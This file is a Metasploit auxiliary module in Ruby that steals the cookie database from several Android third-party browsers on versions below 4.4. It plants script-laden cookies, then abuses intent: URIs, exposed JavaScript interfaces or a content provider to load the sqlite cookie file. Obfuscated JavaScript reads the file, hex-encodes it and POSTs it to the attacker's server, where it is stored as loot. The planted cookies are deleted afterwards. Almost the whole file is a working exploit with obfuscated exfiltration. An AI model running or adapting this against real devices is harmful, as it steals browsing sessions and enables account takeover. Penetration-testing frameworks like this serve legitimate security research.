##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/exploit/jsobfu'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Auxiliary::Report
  include Msf::Exploit::JSObfu

  def initialize(info={})
    super(update_info(info,
      'Name'        => 'Android Third-Party Browser Cookie Theft',
      'Description' => %q{
        On Android < 4.4, many common third-party Android browsers are vulnerable to cookie
        database theft by passing a file:// URL to an intent: URI. By saving a cookie containing
        <script> tags and loading the file URL for the sqlite cookie database into the browser,
        XSS can be achieved in the context of the sqlite cookie database, allowing for
        exfiltration of the entire db.

        The following browsers are vulnerable:
        - Mercury Browser for Android
        - Maxthon Web Browser
        - Cheetah Mobile Browser
        - Jet Browser
        - APUS Browser
        - Boat Browser
      },
      'Author'         => [
        'rotlogix',  # discovered most of these intent schemes
        'joev'       # msf module
      ],
      'License'     => MSF_LICENSE,
      'Actions'     => [[ 'WebServer' ]],
      'PassiveActions' => [ 'WebServer' ],
      'References' =>
        [
          ['URL', 'https://rotlogix.com/2015/10/04/same-s-t-different-browser/']
        ],
      'DefaultAction'  => 'WebServer'
    ))

     register_options([
      OptString.new('COOKIE_FILE', [
        true,
        'The cookie file (on older 2.x devices this is "webview.db")',
        'webviewCookiesChromium.db'
      ])
    ], self.class)
  end

  def on_request_uri(cli, request)
    if request.method =~ /POST/i
      print_status("Processing exfilrated files...")
      process_post(cli, request)
      send_response_html(cli, '')
    elsif request.uri.end_with?('.js')
      print_status("Sending exploit javascript")
      send_response(cli, exfiltration_js, 'Content-type' => 'text/javascript')
    elsif request.uri.end_with?('/' + deletion_token)
      print_status("Destroying cookies")
      send_response_html(cli, destroy_cookies)
    else
      serve_exploit(cli, request)
    end
  end

  def serve_exploit(cli, request)
    cookie = request.headers['User-Agent'] || ''
    ua = request.headers['User-Agent'] || ''
    req_with = request.headers['X-Requested-With'] || ''

    if cookie.include?(per_run_token)
      print_error("User has already been exploited. Bailing.")
      return send_not_found(cli)
    end

    browser = nil
    if ua.include?('ACHEETAHI')
      print_good("Cheetah Mobile Browser detected")
      browser = :cheetah
    elsif req_with == 'com.mx.browser'
      print_good("Maxthon Browser detected")
      browser = :maxthon
    elsif req_with == 'com.ilegendsoft.mercury'
      print_good("Mercury Browser detected")
      browser = :mercury
    elsif req_with == 'com.apusapps.browser'
      print_good("APUS Browser detected")
      browser = :apus
    elsif req_with == 'com.jet.browser'#DEAD
      print_good("Jet Browser detected")
      browser = :jet
    elsif req_with =~ /^com\.boatbrowser\./
      print_good("Boat Browser detected")
      browser = :boat
    end

    if browser.nil?
      if request.qstring['detection']
        print_error request.uri
        print_error "Browser not detected"
      end
      send_not_found(cli)
    else
      print_status("Sending exploit landing page...")
      send_response_html(cli, landing_page_html(browser, request))
    end
  end

  def process_post(cli, request)
    data = hex2bin(request.body)
    print_good "Cookies received: #{request.body.length.to_f/1024}kb"
    loot_path = store_loot(
      "android.browser.cookies",
      'application/x-sqlite3',
      cli.peerhost,
      data,
      'cookies.sqlite',
      "#{cli.peerhost.ljust(16)} Android browser cookie database"
    )
    print_good "SQLite cookie database saved to:\n#{loot_path}"
  end

  def run
    exploit
  end

  def landing_page_html(browser, req)
    %Q|
    <!doctype html>
      <html>
        <head><meta name="viewport" content="width=device-width, user-scalable=no" /></head>
        <body style='width:100%;font-size: 16px;'>
          <script>
            #{set_cookies}
            setTimeout(function() {
              #{exploit_js(browser, req)}
            }, 50);
          </script>
        </body>
      </html>
    |
  end

  def exploit_js(browser, req)
    req_with = req.headers['X-Requested-With'] || ''
    url_map = {
      maxthon: {
        intent: build_intent(
          'S.url', 'com.mx.browser/com.mx.browser.navigation.MxFullscreenWebviewActivity'
        ),
        package: 'com.mx.browser'
      },
      cheetah: {
        intent: build_intent(
          'S.update_btn_right=OK;S.update_url',
          'com.ksmobile.cb/com.ijinshan.browser.push.PushMsgActivity'
        ),
        package: 'com.ksmobile.cb'
      },
      mercury: {
        intent: build_intent(
          'S.load', 'com.ilegendsoft.mercury/com.ilegendsoft.social.common.SimpleWebViewActivity'
        ),
        package: 'com.ilegendsoft.mercury'
      },
      apus: {
        intent: build_intent(
          'S.url', 'com.apusapps.browser/.main.H5GameActivity'
        ),
        package: 'com.apusapps.browser'
      },
      jet: {
        # jet actually just has a js function exposed that allows opening file:// URLs
        # thanks!
        script: 'window.JSInterface.onClick(file);',
        package: 'com.jet.browser'
      },
      boat: {
        script: %Q|
          var url='content://#{req_with}.localfileprovider/data/data/#{req_with}/databases/webviewCookiesChromium.db?#'+hash;
          var i = document.createElement('iframe');
          i.src = url;
          document.body.appendChild(i);
        |,
        package: req_with
      }
    }

    js_obfuscate %Q|
        var hash = '#{Rex::Text.encode_base64(exfiltration_js)}';
        var file = 'file:///data/data/#{url_map[browser][:package]}/databases/webviewCookiesChromium.db#'+hash;
        var url = #{url_map[browser][:intent] || 'null'};
        if (url) {
          window.location = url;
        } else {
          #{url_map[browser][:script]}
        }
    |
  end

  def build_intent(param, component)
    "'intent:#Intent;#{param}='+encodeURIComponent(file)+';SEL;component=#{component};end'"
  end

  def exfiltration_js
    js_obfuscate %Q|
        if (!window.#{per_run_token}) {
          window.#{per_run_token} = true;
          var x = new XMLHttpRequest();
          x.open('GET', '');
          x.responseType = 'arraybuffer';
          x.onload = function(){
              var buff = new Uint8Array(x.response);
              var hex = Array.prototype.map.call(buff, function(d){
                var c = d.toString(16);
                return (c.length < 2) ? '0'+c : c;
              }).join('');
              var x2 = new XMLHttpRequest();
              x2.open('POST', '#{get_uri}/');
              x2.setRequestHeader('Content-type', 'text/plain');
              x2.send(hex);
              x2.onload = x2.onerror = function() {
                location.replace('#{get_uri.chomp('/')}/#{deletion_token}');
              };
          };
          x.send();
        }
      |
  end

  def set_cookies
    10.times.map do |i|
      "document.cookie='#{per_run_token}#{i}=<script>eval(atob(location.hash.slice(1)))<\\/script>';"
    end.join('')
  end

  def destroy_cookies
    '<script>'+10.times.map do |i|
      "document.cookie='#{per_run_token}#{i}=;expires=Sat, 01-Jan-2000 00:00:00 GMT';"
    end.join('')+'</script>'
  end

  def cookie_path(file='')
    '/data/data/com.mx.browser/databases/' + file
  end

  # TODO: Make this a proper Rex::Text function
  def hex2bin(hex)
    hex.chars.each_slice(2).map(&:join).map { |c| c.to_i(16) }.map(&:chr).join
  end

  def per_run_token
    @token ||= Rex::Text.rand_text_alpha(rand(8)+3)
  end

  def deletion_token
    @deletion_token ||= Rex::Text.rand_text_alpha(rand(12)+8)
  end

end
